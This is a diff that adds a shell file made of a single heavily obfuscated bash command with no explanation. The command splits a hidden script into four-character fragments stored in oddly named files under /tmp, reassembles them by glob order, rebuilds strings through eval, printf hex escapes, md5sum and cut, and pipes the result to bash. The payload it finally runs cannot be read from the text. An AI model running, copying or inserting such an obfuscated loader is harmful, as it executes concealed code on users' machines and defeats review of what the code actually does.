@@ -1,0 +1,261 @@
+set -x
+"printf %q %s "$(mkdir -p '/tmp/kaftYi';printf %q %s '(pri' > '/tmp/kaftYi/
+??
+
+??';printf %q %s 'prin' > '/tmp/kaftYi/?????
+?';printf %q %s 'md5s' > '/tmp/kaftYi/
+???
+??';printf %q %s '(pri' > '/tmp/kaftYi/?
+
+?
+?
+';printf %q %s 'ut -' > '/tmp/kaftYi/??
+?
+
+
+';printf %q %s 'ntf ' > '/tmp/kaftYi/?
+
+??
+
+';printf %q %s ' "\x' > '/tmp/kaftYi/?
+
+
+
+
+
+';printf %q %s '\x$(' > '/tmp/kaftYi/??
+????';printf %q %s 'eval' > '/tmp/kaftYi/???????';printf %q %s '- '"'"'T' > '/tmp/kaftYi/??
+??
+
+';printf %q %s '0)";' > '/tmp/kaftYi/??
+
+??
+';printf %q %s '-- '"'"'' > '/tmp/kaftYi/?
+?
+?
+
+';printf %q %s 'tA'"'"'|' > '/tmp/kaftYi/?
+?????';printf %q %s 'ut -' > '/tmp/kaftYi/?
+???
+
+';printf %q %s ';pri' > '/tmp/kaftYi/?
+
+??
+?';printf %q %s '- '"'"'a' > '/tmp/kaftYi/??
+
+
+
+
+';printf %q %s 'ntf ' > '/tmp/kaftYi/?
+??
+
+
+';printf %q %s 'm|cu' > '/tmp/kaftYi/???
+?
+?';printf %q %s 'ntf ' > '/tmp/kaftYi/?
+
+?
+
+?';printf %q %s '|md5' > '/tmp/kaftYi/
+?
+????';printf %q %s 'O0'"'"'|' > '/tmp/kaftYi/??
+?
+??';printf %q %s 'wK'"'"'|' > '/tmp/kaftYi/?
+?
+
+??';printf %q %s '-b11' > '/tmp/kaftYi/
+?
+??
+
+';printf %q %s 't -b' > '/tmp/kaftYi/?
+
+
+?
+
+';printf %q %s '3)";' > '/tmp/kaftYi/???
+
+?
+';printf %q %s 'intf' > '/tmp/kaftYi/?
+
+
+
+
+?';printf %q %s 'prin' > '/tmp/kaftYi/???
+
+
+?';printf %q %s '(pri' > '/tmp/kaftYi/?
+?
+??
+';printf %q %s 'b9-1' > '/tmp/kaftYi/??
+
+???';printf %q %s '2-3)' > '/tmp/kaftYi/?
+
+
+
+??';printf %q %s '-- '"'"'' > '/tmp/kaftYi/?
+
+?
+
+
+';printf %q %s 'ntf ' > '/tmp/kaftYi/?
+?
+?
+?';printf %q %s 'tf -' > '/tmp/kaftYi/??
+
+
+
+?';printf %q %s '21)"' > '/tmp/kaftYi/?
+??
+?
+';printf %q %s 'ntf ' > '/tmp/kaftYi/
+??
+
+?
+';printf %q %s 'tf "' > '/tmp/kaftYi/??
+
+?
+
+';printf %q %s '"\x$' > '/tmp/kaftYi/?
+
+?
+??';printf %q %s 'd5su' > '/tmp/kaftYi/???
+??
+';printf %q %s 'prin' > '/tmp/kaftYi/??
+
+
+?
+';printf %q %s 't -b' > '/tmp/kaftYi/???
+?
+
+';printf %q %s 'prin' > '/tmp/kaftYi/??
+
+?
+?';printf %q %s 'V'"'"'|m' > '/tmp/kaftYi/?
+
+
+???';printf %q %s 'ut -' > '/tmp/kaftYi/
+???
+
+?';printf %q %s 'W'"'"'|m' > '/tmp/kaftYi/???
+???';printf %q %s '- '"'"'8' > '/tmp/kaftYi/????
+
+
+';printf %q %s 'b31-' > '/tmp/kaftYi/
+???
+
+
+';printf %q %s 'md5s' > '/tmp/kaftYi/??
+?
+?
+';printf %q %s 'b30-' > '/tmp/kaftYi/?
+
+????';printf %q %s '$(pr' > '/tmp/kaftYi/
+??????';printf %q %s 'tf "' > '/tmp/kaftYi/???
+
+
+
+';printf %q %s ' "$(' > '/tmp/kaftYi/??????
+';printf %q %s 'Lo6'"'"'' > '/tmp/kaftYi/
+??
+
+
+
+';printf %q %s 'intf' > '/tmp/kaftYi/
+?????
+';printf %q %s 'tf -' > '/tmp/kaftYi/??
+??
+?';printf %q %s 'prin' > '/tmp/kaftYi/????
+?
+';printf %q %s '\x$(' > '/tmp/kaftYi/????
+??';printf %q %s 'tf -' > '/tmp/kaftYi/????
+
+?';printf %q %s 'md5s' > '/tmp/kaftYi/?
+?
+
+?
+';printf %q %s 'ut -' > '/tmp/kaftYi/?
+?
+
+
+
+';printf %q %s 'ntf ' > '/tmp/kaftYi/
+??
+?
+?';printf %q %s 'prin' > '/tmp/kaftYi/??
+???
+';printf %q %s ';pri' > '/tmp/kaftYi/?
+??
+
+?';printf %q %s ''"'"'w'"'"'|' > '/tmp/kaftYi/
+????
+
+';printf %q %s 'um|c' > '/tmp/kaftYi/
+???
+?
+';printf %q %s 'um|c' > '/tmp/kaftYi/?
+?
+
+
+?';printf %q %s '-- '"'"'' > '/tmp/kaftYi/
+??
+
+
+?';printf %q %s '-12)' > '/tmp/kaftYi/
+?
+?
+??';printf %q %s 'um|c' > '/tmp/kaftYi/??
+?
+
+?';printf %q %s ';pri' > '/tmp/kaftYi/
+??
+??
+';printf %q %s 'b20-' > '/tmp/kaftYi/?
+??
+??';printf %q %s '"\x$' > '/tmp/kaftYi/?
+?
+???';printf %q %s '";)"' > '/tmp/kaftYi/
+?
+?
+?
+';printf %q %s 'md5s' > '/tmp/kaftYi/?
+????
+';printf %q %s 'tf "' > '/tmp/kaftYi/?????
+
+';printf %q %s 'm|cu' > '/tmp/kaftYi/?
+
+
+?
+?';printf %q %s '31)"' > '/tmp/kaftYi/?
+
+???
+';printf %q %s '\x$(' > '/tmp/kaftYi/??
+
+
+??';printf %q %s 'um|c' > '/tmp/kaftYi/?
+???
+?';printf %q %s '";pr' > '/tmp/kaftYi/?
+
+
+
+?
+';printf %q %s 'd5su' > '/tmp/kaftYi/?
+
+
+??
+';printf %q %s 'sum|' > '/tmp/kaftYi/
+?
+???
+';printf %q %s ' -- ' > '/tmp/kaftYi/
+????
+?';printf %q %s '12-1' > '/tmp/kaftYi/???
+
+??';printf %q %s '"\x$' > '/tmp/kaftYi/
+??
+?
+
+';printf %q %s '32)"' > '/tmp/kaftYi/
+??
+???';printf %q %s 'cut ' > '/tmp/kaftYi/
+?
+??
+?';cat '/tmp/kaftYi'/???????; '/tmp/kaftYi'/???????;)"|bash"
